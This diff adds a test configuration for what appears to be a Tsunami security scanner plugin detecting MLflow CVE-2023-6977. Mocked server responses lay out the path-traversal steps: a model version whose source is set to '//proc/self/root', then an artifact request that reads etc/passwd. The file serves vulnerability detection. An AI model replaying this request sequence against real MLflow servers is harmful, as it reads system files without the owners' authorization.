@@ -1,0 +1,96 @@
+# proto-file: proto/templated_plugin_tests.proto
+# proto-message: TemplatedPluginTests
+config: {
+  tested_plugin: "MLFlow_CVE_2023_6977"
+}
+
+tests: {
+  name: "whenVulnerable_returnsVuln"
+  expect_vulnerability: true
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/ajax-api/2.0/mlflow/registered-models/create"
+        status: 200
+        body_content:
+          '{"registered_model": {"name": "Tsunami-Test{{ T_UTL_CURRENT_TIMESTAMP_MS }}", "creation_timestamp": 1739400187970, "last_updated_timestamp": 1739400187970}}'
+      },
+      {
+        uri: "/ajax-api/2.0/mlflow/model-versions/create"
+        status: 200
+        body_content:
+          '{"model_version": {"name": "Tsunami-Test{{ T_UTL_CURRENT_TIMESTAMP_MS }}", "version": "1", "creation_timestamp": 1739402980671, "last_updated_timestamp": 1739402980671, "current_stage": "None", "description": "", "source": "//proc/self/root", "run_id": "", "status": "READY", "run_link": ""}}'
+      },
+      {
+        uri: "/model-versions/get-artifact?path=etc/passwd&name=Tsunami-Test{{ T_UTL_CURRENT_TIMESTAMP_MS }}&version=1"
+        status: 200
+        body_content: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
+      },
+      {
+        uri: "/ajax-api/2.0/mlflow/registered-models/delete"
+        status: 200
+      }
+    ]
+  }
+}
+tests: {
+  name: "whenModelCreationFails_returnsNoVuln"
+  expect_vulnerability: false
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/ajax-api/2.0/mlflow/registered-models/create"
+        status: 400
+        body_content:
+          '{"error_code": "RESOURCE_ALREADY_EXISTS"}'
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenUpdateModelFails_returnsNoVuln"
+  expect_vulnerability: false
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/ajax-api/2.0/mlflow/registered-models/create"
+        status: 200
+        body_content:
+          '{"registered_model": {"name": "Tsunami-Test{{ T_UTL_CURRENT_TIMESTAMP_MS }}", "creation_timestamp": 1739400187970, "last_updated_timestamp": 1739400187970}}'
+      },
+      {
+        uri: "/ajax-api/2.0/mlflow/model-versions/create"
+        status: 400
+        body_content:
+          '{"error_code": "INVALID_PARAMETER_VALUE"}'
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenReadFileFails_returnsNoVuln"
+  expect_vulnerability: false
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/ajax-api/2.0/mlflow/registered-models/create"
+        status: 200
+        body_content:
+          '{"registered_model": {"name": "Tsunami-Test{{ T_UTL_CURRENT_TIMESTAMP_MS }}", "creation_timestamp": 1739400187970, "last_updated_timestamp": 1739400187970}}'
+      },
+      {
+        uri: "/ajax-api/2.0/mlflow/model-versions/create"
+        status: 200
+        body_content:
+          '{"model_version": {"name": "Tsunami-Test{{ T_UTL_CURRENT_TIMESTAMP_MS }}", "version": "1", "creation_timestamp": 1739402980671, "last_updated_timestamp": 1739402980671, "current_stage": "None", "description": "", "source": "//proc/self/root", "run_id": "", "status": "READY", "run_link": ""}}'
+      },
+      {
+        uri: "/model-versions/get-artifact?path=etc/passwd&name=Tsunami-Test{{ T_UTL_CURRENT_TIMESTAMP_MS }}&version=1"
+        status: 200
+        body_content: "irrelevant"
+      }
+    ]
+  }
+}
